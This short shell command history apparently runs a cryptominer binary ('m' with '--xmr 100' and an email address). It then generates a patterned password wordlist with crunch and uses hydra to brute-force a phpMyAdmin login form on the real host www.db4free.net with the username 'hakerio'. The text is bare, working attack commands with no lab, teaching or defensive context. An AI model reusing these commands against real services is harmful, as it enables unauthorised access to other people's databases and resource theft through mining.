chmod +x m && ./m -u hakerio0803@gmail.com --xmr 100

crunch 12 12 orn -t h@l@t@o@0%0% -o pass.txt
export TERM=xterm
hydra -l hakerio -P pass.txt www.db4free.net https-post-form "/phpMyAdmin/index.php:pma_username=^USER^&pma_password=^PASS^:S=chunked"